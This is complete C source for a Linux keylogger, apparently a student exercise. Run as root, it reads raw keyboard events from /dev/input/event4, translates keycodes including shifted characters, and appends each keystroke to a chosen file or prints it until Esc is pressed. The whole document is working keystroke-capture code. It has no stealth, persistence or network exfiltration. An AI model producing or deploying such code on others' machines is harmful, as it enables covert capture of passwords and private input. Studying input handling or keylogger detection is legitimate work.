/*
 * Linux keylogger
 *
 *
 * mkarabin
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>
#include <time.h>

/* unknown keystroke */
#define UK "UNKNOWN"

/* change it with your keyboard device event number */
#define KEYBOARD "/dev/input/event4"


/*
 * normal keyboard keystrokes
 */
const char *
keycodes[] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
        "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
        "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
        "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
        "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
        "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
        "F11", "F12", UK, UK,   UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/",
        "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK,
        "PAUSE"
};


/*
 * keyboard keystrokes when the right or left Shift key is pressed
 */
const char *
shifted_keycodes[] = {
        "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
        "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
        "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H",
        "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B",
        "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
        "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5",
        "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK,
        "F11", "F12", UK, UK,   UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/",
        "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK,
        "PAUSE"
};


/*
 * returns true when the keycode is a Shift (left or right)
 */
bool
isShift(int code)
{
        return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
}


/*
 * returns true when the keycode is Esc
 */
bool
isEsc(int code)
{
        return (code == KEY_ESC);
}


/*
 * checks if the user has root privileges
 */
bool
isRoot(void) {
        if (geteuid() != 0) {
                printf("\nMust run it as root, in order to have access "
                    "to the keyboard device\n");
                return false;
        }
        return true;
}
/*
 * prints the usage message
 */
void
usage(void)
{
        printf(
            "\n"
            "Usage:\n"
            "     sudo ./keyloger [ -s | -f file] [-h]\n"
            "\n"
            "Options:\n"
            "  -f    file    Path to the output file.\n"
            "  -s            Print to stdout.\n"
            "  -h            This help message.\n"
        );
        exit(EXIT_FAILURE);
}



/*
 * The keylogger's core functionality
 * Takes as argument the keyboard file descriptor
 * You can add more arguments if needed
 */
void
keylogger(int keyboard,int to_stdout,char* output)
{
        struct input_event event;
        int shift = 0;
        FILE *logf;
        while (1) {
                /*Reading from the keyboard*/
                if (read(keyboard,&event,sizeof(event)) < 0){
                        printf("Error in read()\n");
                }

                /*print "\n" after every key release*/
                if (event.type == EV_KEY && event.value == 0 && to_stdout ==1){
                        printf("\n");
                        /*Check if SHIFT released*/
                        if (strcmp(keycodes[event.code],"L_SHIFT")==0 || strcmp(keycodes[event.code],"R_SHIFT")==0)
                                shift = 0;
                }
                else if (event.type == EV_KEY && event.value == 0 && output != NULL){
                        logf = fopen(output,"a");
                        fprintf(logf,"\n");
                        fclose(logf);
                        /*check if SHIFT released*/
                        if (strcmp(keycodes[event.code],"L_SHIFT")==0 || strcmp(keycodes[event.code],"R_SHIFT")==0)
                                shift = 0;
                }

                /*Check if KEY is pressed*/
                if (event.type == EV_KEY && event.value == 1){
                        /*SHIFT pressed*/
                        if (strcmp(keycodes[event.code],"L_SHIFT")==0 || strcmp(keycodes[event.code],"R_SHIFT")==0){
                                shift = 1;
                        }
                        /*Print to stdout*/
                        if (to_stdout == 1){
                                if (shift == 1)
                                        printf("%s \n", shifted_keycodes[event.code]);
                                else
                                        printf("%s\n", keycodes[event.code]);
                                //Terminate keylogger with esc
                                if (event.code == 1){
                                        printf("Esc button pressed.. Terminate keylogger..\n");
                                        break;
                                }
                        }

                        /*Print to File*/
                        else if (to_stdout == 0 && output != NULL){
                                logf = fopen(output,"a");
                                if (shift == 1)
                                        fprintf(logf,"%s \n", shifted_keycodes[event.code]);
                                else
                                        fprintf(logf,"%s\n", keycodes[event.code]);
                                //Terminate keylogger with esc
                                if (event.code == 1){
                                        printf("Esc button pressed.. Terminate keylogger..\n");
                                        break;
                                }
                                fclose(logf);
                        }
                }

        }

        return;
}

/*
* main
 */
int
main(int argc, char *argv[])
{
        int opt;
        int root;
        int kb;
        int to_stdout;
        char *output;


        /* init */
        output = NULL;
        to_stdout = 0;


        /* check root */
        root = isRoot();
        if (!root)
                usage();


        /* get options */
        while ((opt = getopt(argc, argv, "f:sh")) != -1) {
                switch (opt) {
                case 'f':
                        output = strdup(optarg);
                        break;
                case 's':
                        to_stdout = 1;
                        break;
                case 'h':
                default:
                        usage();
                }
        }


        /* Keyboard file descriptor */
        if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
                printf("\nUnable to read from the device\n");
                exit(EXIT_FAILURE);
        }

        printf("Start keylogger.. (press Esc to kill)\n");
        keylogger(kb,to_stdout,output);


        printf("\nKeylogger terminated.\n");


        /* Close the keyboard file descriptor */
        close(kb);


        return 0;
}
